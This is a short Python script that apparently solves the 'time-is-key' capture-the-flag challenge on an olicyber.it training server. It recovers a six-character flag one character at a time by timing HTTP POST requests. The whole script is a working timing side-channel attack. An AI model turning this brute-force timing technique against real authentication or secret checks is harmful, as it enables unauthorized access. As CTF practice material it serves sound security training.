import requests
import string
import time

def tryletter(letter, pos):
    s = ['a'] * 6
    s[pos] = letter
    data = {
        'flag': ''.join(s),
        'submit': 'invia+la+flag'
    }
    requests.post("http://time-is-key.challs.olicyber.it/index.php", data=data)

alphabet = string.ascii_lowercase+"0123456789"
flag = ""
for letter in range(6):
    for c in alphabet:
        st = time.time()
        tryletter(c, letter)
        en = time.time()
        if abs(en-st) > 1 + 0.7:
            flag += c
            print(c)
            break

print(flag)
